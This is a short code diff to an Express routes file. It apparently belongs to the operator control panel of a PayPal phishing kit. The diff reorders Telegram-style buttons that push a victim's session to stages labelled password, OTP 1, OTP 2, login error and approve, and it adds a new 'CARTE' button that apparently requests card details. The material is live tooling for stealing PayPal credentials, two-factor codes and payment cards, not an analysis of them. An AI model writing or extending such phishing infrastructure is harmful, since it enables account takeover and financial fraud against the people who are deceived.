@@ -633,18 +633,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
             { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${sessionId}` }
           ],
           [
-            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` },
-            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` }
+            { text: "💳 CARTE", callback_data: `paypal_card_${sessionId}` },
+            { text: "⏳ WAITING", callback_data: `paypal_waiting_${sessionId}` }
           ],
           [
-            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` },
-            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` }
+            { text: "✅ APPROVE", callback_data: `paypal_approve_${sessionId}` },
+            { text: "🔑 PASSWORD", callback_data: `paypal_password_${sessionId}` }
           ],
           [
-            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` },
-            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` }
+            { text: "🔢 OTP 1", callback_data: `paypal_otp1_${sessionId}` },
+            { text: "🔢 OTP 2", callback_data: `paypal_otp2_${sessionId}` }
           ],
           [
+            { text: "✔️ SUCCESS", callback_data: `paypal_success_${sessionId}` },
             { text: "🏠 HOME", callback_data: `paypal_home_${sessionId}` }
           ]
         ];
